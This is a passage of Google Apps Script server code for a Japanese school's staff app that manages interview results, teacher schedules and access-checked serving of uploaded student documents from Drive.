  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sheetName = role === "teacher" ? "Teacher_Master" : "Staff_Master";
  let sheet = ss.getSheetByName(sheetName);
  if(!sheet) throw new Error("Sheet not found");
  
  let data = sheet.getDataRange().getDisplayValues();
  for(let i=1; i<data.length; i++){
    if(data[i][0] === id) {
      let delName = data[i][1] || "";
      // ⚠️ omit: column 3 is the legacy PIN and 7–11 the password hash/salt — by POSITION,
      // on top of _rowForLog_'s header check, because a credential must never reach the log.
      const gone = _rowForLog_(data[0], data[i], [2, 6, 7, 8, 9, 10]);
      sheet.deleteRow(i + 1);
      _logActivity_({ role: adminRole, name: actorName || "", id: actorId || "" }, "ユーザー削除", sheetName + ": " + delName + " (" + id + ")", gone);
      return "ユーザーを削除しました。";
    }
  }
  throw new Error("ユーザーが見つかりません。");
}

// --- PAST INTERVIEWS ENGINE ---
// ============================================================================
// INTERVIEW RESULTS (new in-app tab: Interview_Results)
// Stage 1 infrastructure. The exact entry columns are finalized in Stage 2;
// for now the tab stores whatever headers the migration/first-entry define,
// plus the duplicate-key fields (name / nationality / age).
// ============================================================================
const INTERVIEW_RESULTS_SHEET = 'Interview_Results';

// Permission helper for the interview-results feature.
// See the note on _hasPerm_: role/perms are ignored when enforcing.
function _hasResultPerm_(role, perms, needed) {
  if (_isMasterRole_(role)) return true;
  // ⚠️ Same line _hasPerm_ and _hasRecruitPerm_ carry, and for the same reason: this
  // helper decides a permission, so it must see 管理者権限. See _hasRecruitPerm_ above.
  if (_isAdminLevel_(role)) return true;
  let list = String(_effectivePerms_(perms) || "");
  return list.indexOf(needed) !== -1;
}

// Get (and lazily create) the Interview_Results sheet.
function _getInterviewResultsSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(INTERVIEW_RESULTS_SHEET);
  if (!sh) {
    sh = ss.insertSheet(INTERVIEW_RESULTS_SHEET);
    // Full column set (Stage 2). Timestamp + EnteredBy are system columns.
    sh.appendRow([
      "Timestamp",
      "日付", "入学期", "課程", "国籍", "名前", "性別", "年齢", "学歴",
      "現在のレベル", "点数", "プレースメントテスト点数", "合否",
      "面接者", "担当", "申請", "2回目面接", "3回目面接", "備考",
      "EnteredBy"
    ]);
  }
  return sh;
}

// Read all interview-result rows from the in-app tab. Returns a 2D array
// (first row = headers) to match the existing front-end table renderer.
// Supply name lists for the interview-result dropdowns:
//  面接者 (interviewers) = Teacher_Master names, 担当 (in charge) = Staff_Master names.
// Available to anyone with entry permission (teachers included).
// Intakes registered anywhere in the app: PlacementTest_Config (the placement /
// booking / results source) UNION Recruitment_Meta (added via 募集状況 ＋入学期).
// Without this, an intake created while recruiting stays invisible to bookings
// and interview results until someone re-types it into the placement config —
// and a slight difference in spelling then produces two variants that never match.
function _allKnownIntakes_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let seen = {}, out = [];
  const push = function(v){
    const s = String(v || "").trim();
    if (s && !seen[s]) { seen[s] = 1; out.push(s); }
  };
  const pSheet = ss.getSheetByName(PLACEMENT_CONFIG_SHEET);
  if (pSheet) {
    const pd = pSheet.getDataRange().getDisplayValues();
    for (let i = 1; i < pd.length; i++) push(pd[i][0]);
  }
  const mSheet = ss.getSheetByName(SHEET_RECRUIT_META);
  if (mSheet) {
    const md = mSheet.getDataRange().getDisplayValues();
    for (let i = 1; i < md.length; i++) {
      if (String(md[i][0]).trim() === "intake") push(md[i][1]);
    }
  }
  // Newest first, parsed from 年/月 so 10月 sorts after 7月.
  const key = function(s){
    const m = String(s || "").match(/(\d{4})\s*年\s*(\d{1,2})\s*月/);
    return m ? (parseInt(m[1], 10) * 100 + parseInt(m[2], 10)) : -1;
  };
  out.sort(function(a, b){
    const ka = key(a), kb = key(b);
    if (ka !== kb) return kb - ka;
    return String(a).localeCompare(String(b), "ja");
  });
  return out;
}

// 学期 (intake) and コース (course) lists for the interview booking modal, both
// sourced from PlacementTest_Config — the same single source of truth the
// placement dashboard and interview-results form use, so they can't drift apart.
// Gated by admissions rights (booking users don't need interview-entry perms).
// Returns { intakes: [...], courses: [...] }.
function getBookingIntakeOptions(role, perms) {
  if (!_hasPerm_(role, perms, "view_admissions") && !_hasPerm_(role, perms, "edit_admissions")
      && !_hasPerm_(role, perms, "view_teacher_schedule")) {
    throw new Error("権限がありません");
  }
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let pSheet = ss.getSheetByName(PLACEMENT_CONFIG_SHEET);
  if (!pSheet) return { intakes: [], courses: [] };
  let pd = pSheet.getDataRange().getDisplayValues();
  let intakes = _allKnownIntakes_();   // PlacementTest_Config ∪ Recruitment_Meta
  let seenI = {}, seenC = {}, courses = [];
  intakes.forEach(function(i){ seenI[i] = 1; });
  for (let i = 1; i < pd.length; i++) {
    let it = String(pd[i][0] || "").trim(); // Intake Name (col 1)
    let co = String(pd[i][1] || "").trim(); // Course (col 2)
    if (it && !seenI[it]) { seenI[it] = 1; intakes.push(it); }
    if (co && !seenC[co]) { seenC[co] = 1; courses.push(co); }
  }
  return { intakes: intakes, courses: courses };
}

function getInterviewResultOptions(role, perms) {
  if (!_hasResultPerm_(role, perms, "entry_interview_results")) throw new Error("権限がありません");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let teachers = [], staff = [];

  let tSheet = ss.getSheetByName("Teacher_Master");
  if (tSheet) {
    let td = tSheet.getDataRange().getDisplayValues();
    for (let i = 1; i < td.length; i++) {
      let nm = String(td[i][1] || "").trim();
      if (nm) teachers.push(nm);
    }
  }

  let sSheet = ss.getSheetByName("Staff_Master");
  if (sSheet) {
    let sd = sSheet.getDataRange().getDisplayValues();
    for (let i = 1; i < sd.length; i++) {
      let nm = String(sd[i][1] || "").trim();
      if (nm) staff.push(nm);
    }
  }

  // De-duplicate while preserving order.
  let uniq = function(a){ let seen={}, out=[]; a.forEach(function(x){ if(!seen[x]){seen[x]=1;out.push(x);} }); return out; };

  // Courses come from PlacementTest_Config; intakes come from every source that
  // registers one (placement config ∪ 募集状況), so an intake created while
  // recruiting is immediately selectable here too.
  let intakes = _allKnownIntakes_();
  let courses = [];
  let pSheet = ss.getSheetByName(PLACEMENT_CONFIG_SHEET);
  if (pSheet) {
    let pd = pSheet.getDataRange().getDisplayValues();
    for (let i = 1; i < pd.length; i++) {
      let co = String(pd[i][1] || "").trim();   // Course (col 2)
      if (co) courses.push(co);
    }
  }

  return {
    interviewers: uniq(teachers),
    incharge: uniq(staff),
    intakes: uniq(intakes),
    courses: uniq(courses)
  };
}

// Resolve a sheet header to its canonical field name: strips whitespace and a
// trailing parenthetical, so a header renamed for clarity (e.g. 「点数（面接）」)
// still maps to the field the form sends (「点数」). Without this, renaming a
// header silently breaks saving that column (exact-match lookup finds nothing
// and writes blank).
function _irCanonicalHeader_(h) {
  return String(h == null ? "" : h)
    .replace(/[\s\u3000]/g, "")
    .replace(/[（(][^）)]*[）)]$/, "");
}

// Look up an entry value by header, tolerating renamed headers.
function _irEntryValue_(entry, h) {
  if (entry[h] != null) return entry[h];
  let c = _irCanonicalHeader_(h);
  return (entry[c] != null) ? entry[c] : null;
}

// Update an existing interview-result row (by sheet row index). Gated by the
// same entry_interview_results permission. Does not run the duplicate guard
// (editing an existing row shouldn't flag itself). Preserves Timestamp and the
// original EnteredBy; records who last edited in EnteredBy if provided.
// Delete one interview-result row by its sheet row index (1-based, matching the
// _sheetRow tag used by the table). Snapshots first for recoverability.
function deleteInterviewResult(role, perms, rowIndex, actorName, actorId) {
  if (!_hasResultPerm_(role, perms, "entry_interview_results")) throw new Error("権限がありません");
  const sh = _getInterviewResultsSheet_();
  const allData = sh.getDataRange().getDisplayValues();
  rowIndex = parseInt(rowIndex, 10);
  if (isNaN(rowIndex) || rowIndex < 2 || rowIndex > allData.length) {
    throw new Error("削除対象の行が見つかりません。");
  }
  // Capture the student name for the audit log before deleting.
  const headers = allData[0] || [];
  const iName = _resultColIndex_(headers, ["名前", "氏名", "Name"]);
  const delName = iName >= 0 ? String(allData[rowIndex - 1][iName] || "") : "";

  const gone = _rowForLog_(headers, allData[rowIndex - 1]);
  sh.deleteRow(rowIndex);
  _bustInterviewCache_();
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "面接結果を削除", delName, gone); } catch (e) {}
  return { deleted: true };
}

function updateInterviewResult(role, perms, rowIndex, entry) {
  if (!_hasResultPerm_(role, perms, "entry_interview_results")) throw new Error("権限がありません");
  const sh = _getInterviewResultsSheet_();
  const allData = sh.getDataRange().getDisplayValues();
  const headers = allData[0] || [];
  rowIndex = parseInt(rowIndex, 10);
  if (isNaN(rowIndex) || rowIndex < 2 || rowIndex > allData.length) {
    throw new Error("編集対象の行が見つかりません。");
  }
  entry = entry || {};


  const existing = allData[rowIndex - 1]; // 0-based array index for this sheet row
  let row = headers.map(function(h, ci) {
    if (h === "Timestamp") return existing[ci];            // keep original timestamp
    if (h === "EnteredBy") return (entry.__enteredBy != null && entry.__enteredBy !== "") ? entry.__enteredBy : existing[ci];
    let v = _irEntryValue_(entry, h); // tolerant of renamed headers e.g. 点数（面接）
    return (v != null ? v : "");
  });
  sh.getRange(rowIndex, 1, 1, headers.length).setValues([row]);
  _bustInterviewCache_();

  try { _logActivity_({ role: role, name: entry.__enteredBy || "", id: entry.__enteredById || "" }, "面接結果を編集", (entry["名前"] || entry["氏名"] || ""), ""); } catch (e) {}
  return { saved: true };
}

// Measured at 240-347ms for a 48KB payload, and the sheet only changes when
// someone saves, edits, deletes or imports a result — the four call sites that
// call _bustInterviewCache_. Permission check stays in the wrapper so a cache hit
// can never bypass authorisation.
function _bustInterviewCache_() {
  try { CacheService.getScriptCache().remove('v' + _cacheVersion_() + '_interviewResults'); } catch (e) {}
  _forgetTab_(INTERVIEW_RESULTS_SHEET);
}

function getInterviewResults(role, perms) {
  if (!_hasResultPerm_(role, perms, "view_interview_results")) throw new Error("権限がありません");
  const data = _cached_('interviewResults', CACHE_TTL_SHORT, function () {
    _getInterviewResultsSheet_();   // ensure it exists before the batched read
    return _readTabs_([INTERVIEW_RESULTS_SHEET])[INTERVIEW_RESULTS_SHEET] || [];
  });
  return data.length > 0 ? data : [["データがありません"]];
}

// Check for a likely duplicate by cross-matching 氏名 + 国籍 + 年齢.
// Returns { duplicate: true/false, matches: [...] }. Does NOT block; the
// front-end shows a confirm dialog and may still save.
function checkInterviewResultDuplicate(role, perms, name, nationality, age) {
  if (!_hasResultPerm_(role, perms, "entry_interview_results")) throw new Error("権限がありません");
  const sh = _getInterviewResultsSheet_();
  const data = sh.getDataRange().getDisplayValues();
  if (data.length < 2) return { duplicate: false, matches: [] };

  const headers = data[0];
  const iName = _resultColIndex_(headers, ["氏名", "名前", "Name"]);
  const iNat  = _resultColIndex_(headers, ["国籍", "Nationality"]);
  const iAge  = _resultColIndex_(headers, ["年齢", "Age"]);

  const nm = _normResult_(name), nt = _normResult_(nationality), ag = _normResult_(age);
  let matches = [];
  for (let i = 1; i < data.length; i++) {
    let rN = iName >= 0 ? _normResult_(data[i][iName]) : "";
    let rT = iNat  >= 0 ? _normResult_(data[i][iNat])  : "";
    let rA = iAge  >= 0 ? _normResult_(data[i][iAge])  : "";
    if (rN !== "" && rN === nm && rT === nt && rA === ag) {
      matches.push({ rowIndex: i + 1, name: data[i][iName], nationality: iNat >= 0 ? data[i][iNat] : "", age: iAge >= 0 ? data[i][iAge] : "" });
    }
  }
  return { duplicate: matches.length > 0, matches: matches };
}

// Save one interview-result entry. `entry` is an object keyed by header name.
// `force` skips the duplicate guard (used after the user confirms).
// Pull booked interviews from Schedule_DB into Interview_Results as skeleton
// rows that people fill in (点数, 合否, etc.) later. On-demand (button-driven).
// Rules, per design:
//   • only Booked interviews whose date is on or before today (same-day allowed),
//   • dedup on 名前 + 日付 — skip any booking that already has a result row for
//     that student on that date (so re-running only adds what's new),
//   • fields copied from the booking: 日付, 名前, 国籍, 課程, 入学期, 担当, 備考;
//     everything else (scores, 合否, …) is left blank for the interviewer.
function importResultsFromBookings(role, perms, actorName, actorId) {
  if (!_hasResultPerm_(role, perms, "entry_interview_results")) throw new Error("権限がありません");

  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sched = ss.getSheetByName("Schedule_DB");
  if (!sched) return { added: 0, skipped: 0, message: "面接スケジュールのデータが見つかりません。（SYS-01）" };

  const sh = _getInterviewResultsSheet_();
  const rData = sh.getDataRange().getDisplayValues();
  const headers = rData[0];
  const riName = _resultColIndex_(headers, ["名前", "氏名", "Name"]);

  // One result record per student, ever: dedup on NAME ALONE. If a student
  // already has any result row (including from an earlier interview or a
  // re-interview), the import skips them — re-interviews of students who
  // already have a record never create a second blank row.
  let existing = {};
  for (let i = 1; i < rData.length; i++) {
    let nm = _normResult_(rData[i][riName]);
    if (nm !== "") existing[nm] = true;
  }

  // Today (end of day) for the date-<=-today filter.
  let today = new Date(); today.setHours(23, 59, 59, 999);

  const sd = sched.getDataRange().getDisplayValues();
  let toAppend = [], seenThisRun = {}, skipped = 0;
  for (let i = 1; i < sd.length; i++) {
    let status = String(sd[i][5] || "").trim();
    let student = String(sd[i][6] || "").trim();
    if (status !== "Booked" || student === "") continue;

    let rawDate = sd[i][3];
    let d = _parseSheetDate_(rawDate);
    if (!d || d.getTime() > today.getTime()) continue; // future bookings excluded

    let key = _normResult_(student);
    if (existing[key] || seenThisRun[key]) { skipped++; continue; }
    seenThisRun[key] = true;

    let vals = {
      "日付": _formatDateKey_(rawDate),
      "名前": student,
      "国籍": String(sd[i][7] || "").trim(),
      "課程": String(sd[i][10] || "").trim(),
      "入学期": String(sd[i][23] || "").trim(),
      "面接者": String(sd[i][2] || "").trim(),
      "担当": String(sd[i][11] || "").trim(),
      "備考": String(sd[i][24] || "").trim()
    };
    let row = headers.map(function(h) {
      if (h === "Timestamp") return new Date();
      if (h === "EnteredBy") return actorName || "";
      return (vals[h] != null) ? vals[h] : "";
    });
    toAppend.push(row);
  }

  if (toAppend.length > 0) {
    try { _snapshotSheet_(INTERVIEW_RESULTS_SHEET); } catch (e) {}
    sh.getRange(sh.getLastRow() + 1, 1, toAppend.length, headers.length).setValues(toAppend);
    _bustInterviewCache_();
    _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "面接予約から結果を取込", INTERVIEW_RESULTS_SHEET, toAppend.length + "件");
  }
  return { added: toAppend.length, skipped: skipped,
           message: toAppend.length + "件を取り込みました。" + (skipped > 0 ? "（既に存在する " + skipped + " 件はスキップ）" : "") };
}

function _parseSheetDate_(v) {
  if (v instanceof Date) return v;
  let s = String(v || "").trim();
  if (!s) return null;
  let m = s.match(/(\d{4})[\/\-年](\d{1,2})[\/\-月](\d{1,2})/);
  if (m) return new Date(parseInt(m[1],10), parseInt(m[2],10)-1, parseInt(m[3],10));
  let d = new Date(s);
  return isNaN(d.getTime()) ? null : d;
}
function _formatDateKey_(v) {
  let d = _parseSheetDate_(v);
  if (!d) return String(v || "").trim();
  return d.getFullYear() + "/" + ("0"+(d.getMonth()+1)).slice(-2) + "/" + ("0"+d.getDate()).slice(-2);
}

function saveInterviewResult(role, perms, entry, force) {
  if (!_hasResultPerm_(role, perms, "entry_interview_results")) throw new Error("権限がありません");
  const sh = _getInterviewResultsSheet_();
  const headers = sh.getDataRange().getDisplayValues()[0] || ["Timestamp", "氏名", "国籍", "年齢", "EnteredBy"];

  entry = entry || {};

  // Duplicate guard (unless forced). Cross-match name + nationality + age.
  if (!force) {
    let dup = checkInterviewResultDuplicate(role, perms,
      entry["氏名"] || entry["名前"] || entry["Name"] || "",
      entry["国籍"] || entry["Nationality"] || "",
      entry["年齢"] || entry["Age"] || "");
    if (dup.duplicate) {
      return { saved: false, duplicate: true, matches: dup.matches };
    }
  }

  // Append a row aligned to headers.

  let row = headers.map(function(h) {
    if (h === "Timestamp") return new Date();
    if (h === "EnteredBy") return (entry.__enteredBy || "");
    let v = _irEntryValue_(entry, h); // tolerant of renamed headers e.g. 点数（面接）
    return (v != null ? v : "");
  });
  sh.appendRow(row);
  _bustInterviewCache_();

  try { _logActivity_({ role: role, name: entry.__enteredBy || "", id: entry.__enteredById || "" }, "面接結果を入力", (entry["氏名"] || entry["名前"] || ""), ""); } catch (e) {}
  return { saved: true, duplicate: false };
}

// Autofill lookup: given a name (+ optional course), return the most recent
// prior entry for that student so the form can prefill repeat interviews.
// Matches on 名前 (+ 課程 when provided). Returns the row as an object keyed by
// header, or null if no prior entry exists.
// Internal: most-recent Interview_Results row for a normalized name (and
// optionally course). Shared by the interview-entry autofill and the shinsei
// autofill so both stay consistent. Returns {header: value} or null.
function _lookupInterviewResultInternal_(name, course) {
  const sh = _getInterviewResultsSheet_();
  const data = sh.getDataRange().getDisplayValues();
  if (data.length < 2) return null;

  const headers = data[0];
  const iName = _resultColIndex_(headers, ["名前", "氏名", "Name"]);
  const iCourse = _resultColIndex_(headers, ["課程", "コース", "Course"]);
  if (iName < 0) return null;

  const nm = _normResult_(name);
  const cs = _normResult_(course);
  // Walk from the bottom up so the most recent matching entry wins.
  for (let i = data.length - 1; i >= 1; i--) {
    let rN = _normResult_(data[i][iName]);
    if (rN === "" || rN !== nm) continue;
    if (cs !== "" && iCourse >= 0 && _normResult_(data[i][iCourse]) !== cs) continue;
    // Build an object keyed by header name — plus canonical aliases so a
    // renamed header (e.g. 点数（面接）) is still readable as 点数 by autofills.
    let obj = {};
    headers.forEach(function(h, ci) {
      obj[h] = data[i][ci];
      let c = _irCanonicalHeader_(h);
      if (c && !(c in obj)) obj[c] = data[i][ci];
    });
    return obj;
  }
  return null;
}

function lookupPriorInterviewResult(role, perms, name, course) {
  if (!_hasResultPerm_(role, perms, "entry_interview_results")) throw new Error("権限がありません");
  return _lookupInterviewResultInternal_(name, course);
}

// Shinsei autofill: same lookup, but gated by shinsei-edit rights (a shinsei
// user shouldn't need interview-entry permission just to prefill from results).
function shinsei_lookupInterviewResult(role, perms, name) {
  if (!_hasPerm_(role, perms, "edit_shinsei") && !_hasResultPerm_(role, perms, "entry_interview_results")) {
    throw new Error("権限がありません");
  }
  return _lookupInterviewResultInternal_(name, "");
}

function _resultColIndex_(headers, names) {
  for (let i = 0; i < headers.length; i++) {
    let h = String(headers[i]).replace(/[\s　]/g, "");
    for (let n of names) { if (h === String(n).replace(/[\s　]/g, "")) return i; }
  }
  return -1;
}
function _normResult_(v) {
  return String(v == null ? "" : v).replace(/[\s　]/g, "").toLowerCase().trim();
}


// The five YYYY-MM-DD strings of the week starting at `weekStart`, or null if
// it is missing or malformed (in which case the caller must not filter).
//
// Dates are handled as STRINGS end to end. Schedule_DB's date column already
// displays as YYYY-MM-DD — _findScheduleRow_ relies on exactly that with a ===
// compare — and the front-end's formatDate() emits the same shape. Parsing with
// new Date("2026-07-31") would read it as UTC and shift the day for anyone east
// of Greenwich, so the components are split out and rebuilt by hand instead.
function _weekDateStrings_(weekStart) {
  const m = /^(\d{4})-(\d{2})-(\d{2})$/.exec(String(weekStart || "").trim());
  if (!m) return null;
  const d = new Date(parseInt(m[1], 10), parseInt(m[2], 10) - 1, parseInt(m[3], 10));
  if (isNaN(d.getTime())) return null;
  let out = [];
  for (let i = 0; i < 5; i++) {
    const y = d.getFullYear();
    const mo = ('0' + (d.getMonth() + 1)).slice(-2);
    const da = ('0' + d.getDate()).slice(-2);
    out.push(y + '-' + mo + '-' + da);
    d.setDate(d.getDate() + 1);
  }
  return out;
}

// A slot is PAST once its START time has passed, in Asia/Tokyo — so at 13:10 the
// 13:00 ~ 13:30 slot is past and 13:30 ~ 14:00 is not.
//
// Compared as "yyyy-MM-dd HH:mm" strings, which sort chronologically because every
// part is zero-padded. Same reason as _weekDateStrings_: no new Date("2026-09-07"),
// which parses as UTC and shifts the day.
//
// ⚠️ Unparseable means NOT past. The caller still has to match a real row by exact
// string, so a malformed value cannot book anything; refusing it here would only turn
// an odd legacy row into an uneditable one.
function _slotIsPast_(date, period, nowKey) {
  const d = /^(\d{4})-(\d{2})-(\d{2})$/.exec(String(date || "").trim());
  const p = /^(\d{1,2}):(\d{2})/.exec(String(period || "").trim());
  if (!d || !p) return false;
  const slotKey = d[1] + "-" + d[2] + "-" + d[3] + " " + ("0" + p[1]).slice(-2) + ":" + p[2];
  const now = nowKey || Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm");
  return slotKey < now;
}

// weekStartDate filters to that Mon-Fri week; an empty/absent/malformed value
// returns every week.
//
// The front-end deliberately asks for EVERYTHING (calLoadData passes ""), and
// then navigates between weeks purely client-side. Filtering per week would
// make this call smaller, but it would put a ~1s round trip behind every arrow
// press, which is the cost that actually gets noticed. One 101KB payload on
// entering the tab beats twenty small ones.
//
// The filter is kept because it is the natural lever if Schedule_DB outgrows a
// single payload — it only ever accumulates rows.
function getAllTeachersSchedule(weekStartDate) {
  _requireSession_("getAllTeachersSchedule");
  const tabs = _readTabs_(["Teacher_Master", "Schedule_DB"]);
  const tData = tabs["Teacher_Master"] || [];
  const sData = tabs["Schedule_DB"] || [];
  if (!tData.length) return { teachers: [], scheduleByTeacher: {} };

  let teachers = [];
  for (let i = 1; i < tData.length; i++) {
    if (tData[i][0]) teachers.push({ id: String(tData[i][0]).trim(), name: String(tData[i][1]).trim() });
  }

  let scheduleByTeacher = {};
  teachers.forEach(t => scheduleByTeacher[t.id] = []);

  // An absent or unparseable week means "no filter" — the previous behaviour,
  // so a stale caller still works rather than silently getting an empty grid.
  const week = _weekDateStrings_(weekStartDate);
  let inWeek = {};
  if (week) week.forEach(function (d) { inWeek[d] = true; });

  for (let i = 1; i < sData.length; i++) {
    if (week && !inWeek[String(sData[i][3]).trim()]) continue;
    let tid = String(sData[i][1]).trim();
    if (scheduleByTeacher.hasOwnProperty(tid)) {
      scheduleByTeacher[tid].push({
        date: sData[i][3],
        period: sData[i][4],
        status: sData[i][5],
        student: sData[i][6] || "",
        nationality: sData[i][7] || "",
        meetingLink: sData[i][8] || "",
        documentUrl: sData[i][9] || "",
        course: sData[i][10] || "",
        inCharge: sData[i][11] || "",
        intake: sData[i][23] || "",
        remarks: sData[i][24] || "",
        reassignToId: sData[i][12] || "",
        reassignToName: sData[i][13] || "",
        reassignNewDate: sData[i][14] || "",
        reassignNewPeriod: sData[i][15] || "",
        // ⚠️ The BookerReq block was absent from this payload, so the teacher's
        // modal had no idea a 日時変更 was pending — which is how a cancellation
        // came to be raised on top of one. Four short strings per slot.
        bookerReqStatus: sData[i][19] || "",
        bookerNewDate: sData[i][16] || "",
        bookerNewPeriod: sData[i][17] || "",
        bookerReason: sData[i][18] || ""
      });
    }
  }
  return { teachers: teachers, scheduleByTeacher: scheduleByTeacher };
}

// ============================================================================
// HEARING SHEETS (面接書類)
//
// These are scans about named students. They used to be published with
// ANYONE_WITH_LINK on upload, because the front-end handed the teacher a raw
// Drive URL and their browser opened Drive as *them* — unshared, they got
// "request access".
//
// The app runs executeAs USER_DEPLOYING, so it can read any file the deployer
// owns regardless of sharing. Serving the bytes through getUploadedFile() keeps
// access identical for teachers and lets the files stay private.
// ============================================================================

// Drive file ids inside the URLs stored in Schedule_DB idx 9. This is the
// allow-list for getUploadedFile — see the warning there.
function _hearingSheetFileIds_() {
  const data = _readTabs_(["Schedule_DB"])["Schedule_DB"] || [];
  let ids = {};
  for (let i = 1; i < data.length; i++) {
    const url = String(data[i][9] || "").trim();
    if (!url) continue;
    const m = url.match(/[-\w]{25,}/);
    if (m) ids[m[0]] = true;
  }
  return ids;
}

// Drive file ids attached to buildings — 別紙 (ごみ出しルール, オートロック設定…).
// Building_Info idx 44, comma-separated; the same parse getAllBuildingDocs uses.
// The second allow-list for getUploadedFile.
function _buildingDocFileIds_() {
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_BUILDING);
  if (!sheet) return {};
  const data = sheet.getDataRange().getDisplayValues();
  let ids = {};
  for (let i = 1; i < data.length; i++) {
    String(data[i][44] || "").split(",").forEach(function (s) {
      const v = s.trim();
      if (v !== "") ids[v] = true;
    });
  }
  return ids;
}

// Drive file ids of 共通別紙 — documents attached to no building at all.
// General_Docs row 2 col 1, comma-separated. The THIRD allow-list for
// getUploadedFile.
//
// ⚠️ Deliberately does NOT use _getGeneralDocsSheet_(), which inserts the sheet when
// it is missing. That is right on the write path and wrong here: getUploadedFile is
// a read, and a refused open must not create a sheet as a side effect.
function _generalDocFileIds_() {
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_GENERAL_DOCS);
  if (!sheet || sheet.getLastRow() < 2) return {};
  let ids = {};
  String(sheet.getRange(2, 1).getDisplayValue() || "").split(",").forEach(function (s) {
    const v = s.trim();
    if (v !== "") ids[v] = true;
  });
  return ids;
}

const UPLOADED_FILE_MAX_BYTES = 25 * 1024 * 1024;   // base64 inflates this by ~1/3

// Return an uploaded document as base64 for the front-end to download. Serves
// both hearing sheets (Schedule_DB) and building 別紙 (Building_Info).
//
// ⚠️ THE MEMBERSHIP CHECK BELOW IS THE POINT OF THIS FUNCTION. It reads as the
// deployer, so without it any logged-in user could pass any Drive file id the
// deployer owns — the bound spreadsheet, the SMS_Backups_… snapshots, the photo
// folder — and this would be a far worse hole than the link-sharing it replaces.
// A format check is not enough: the id must actually be attached to a record.
function getUploadedFile(role, perms, fileUrl) {
  // It serves hearing sheets and 別紙, so either permission is enough to be
  // looking at a record that legitimately carries one.
  if (!_permOrLegacyRole_(role, perms, "view_dorms", ["sales", "teacher"]) &&
      !_hasPerm_(role, perms, "view_interview_results")) {
    throw new Error("権限がありません");
  }

  const m = String(fileUrl || "").match(/[-\w]{25,}/);
  if (!m) throw new Error("ファイルが指定されていません。");
  const id = m[0];

  // Hearing sheets first, then building 別紙, then 共通別紙 — each list costs a read,
  // and this is ordered by how often each is opened, so the common case still pays
  // for only one. 共通 is the rarest and short-circuits last.
  //
  // ⚠️ Adding a fourth document store means adding a fourth term HERE. A store the
  // check does not know about is unreachable: the file uploads, lists and renames
  // fine, and every attempt to open it is refused. That is exactly how 共通別紙
  // shipped broken — see TECHNICAL_REFERENCE §5.
  if (!_hearingSheetFileIds_()[id] && !_buildingDocFileIds_()[id] && !_generalDocFileIds_()[id]) {
    // Deliberately vague to the caller; the detail goes to Cloud Logging.
    try { console.warn("getUploadedFile rejected an id attached to no record: " + id); } catch (e) {}
    throw new Error("この書類にはアクセスできません。");
  }

  let file;
  try { file = DriveApp.getFileById(id); }
  catch (e) { throw new Error("書類が見つかりません。削除された可能性があります。"); }

  const blob = file.getBlob();
  const bytes = blob.getBytes();
  if (bytes.length > UPLOADED_FILE_MAX_BYTES) {
    throw new Error("書類のサイズが大きすぎます（" + Math.round(bytes.length / 1048576) + "MB）。");
  }

  return {
    base64: Utilities.base64Encode(bytes),
    mimeType: blob.getContentType() || "application/octet-stream",
    name: file.getName()
  };
}

// One-off, run from the editor AFTER confirming the new viewer works in
// production — see the ordering note below. Undoes the historical
// ANYONE_WITH_LINK sharing on every hearing sheet.
//
// Ordering matters: revoking before the new viewer is live makes the documents
// unreachable, and revoking also closes the rollback window, because reverting
// the code puts teachers back on raw Drive links to files that are now private.
function revokeHearingSheetSharing() {
  _requireMaintenanceUnlock_("revokeHearingSheetSharing");
  const sSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Schedule_DB");
  if (!sSheet) return "Schedule_DB not found";
  const data = sSheet.getDataRange().getDisplayValues();
  let fixed = 0, failed = 0, seen = {};
  for (let i = 1; i < data.length; i++) {
    let url = String(data[i][9] || "").trim();
    if (!url || seen[url]) continue;
    seen[url] = true;
    let m = url.match(/[-\w]{25,}/);
    if (!m) continue;
    try {
      DriveApp.getFileById(m[0]).setSharing(DriveApp.Access.PRIVATE, DriveApp.Permission.NONE);
      fixed++;
    } catch (e) { failed++; }
  }
  return "共有を解除: " + fixed + "件 / 失敗: " + failed + "件";
}

// One slot's identity. TRIMMED on both sides: the calendar compares these as exact
// strings, and a stray space in a Teacher ID cell made the same slot two keys.
function _schedKey_(teacherId, date, period) {
  return String(teacherId == null ? "" : teacherId).trim() + "_" +
         String(date == null ? "" : date).trim() + "_" +
         String(period == null ? "" : period).trim();
}

// ⚠️ LOCKED, and the emails go out only AFTER the lock is released.
//
// Two saves of the same brand-new slot used to both miss it in rowMap and both
// append, leaving Schedule_DB with two rows for one slot. That duplicate is what made
// a 担当 editing an old booking send the teacher a fresh 【面接予約】新規予約 email (see
// rowMap below). The lock closes the race; Gmail stays outside it because each send
// can take a second and nothing else needs to wait on that.
//
// The document lock, not _withSessionLock_'s script lock, so a schedule save never
// queues behind session bookkeeping. getDocumentLock() is null outside a bound
// context, hence the fallback.
function saveScheduleBatch(updatesArray, actorName, actorRole) {
  _requireSession_("saveScheduleBatch");
  if (!updatesArray || updatesArray.length === 0) return "保存するデータがありません。";
  actorName = String(actorName || "").trim();
  actorRole = String(actorRole || "").trim();

  const lock = LockService.getDocumentLock() || LockService.getScriptLock();
  if (!lock.tryLock(15000)) throw new Error("他の保存処理中です。もう一度お試しください。");
  const notify = [];
  let result;
  try {
    result = _saveScheduleBatchLocked_(updatesArray, actorName, actorRole, notify);
  } finally {
    lock.releaseLock();
  }
  // ⚠️ After the writes, never before. The email used to be sent ahead of the row
  // write, so a save that then failed had already told the teacher about a booking.
  notify.forEach(function (send) {
    try { send(); } catch (e) { console.error("Schedule email error: " + e.message); }
  });
  return result;
}

function _saveScheduleBatchLocked_(updatesArray, actorName, actorRole, notify) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sSheet = ss.getSheetByName("Schedule_DB");
  if (!sSheet) {
    sSheet = ss.insertSheet("Schedule_DB");
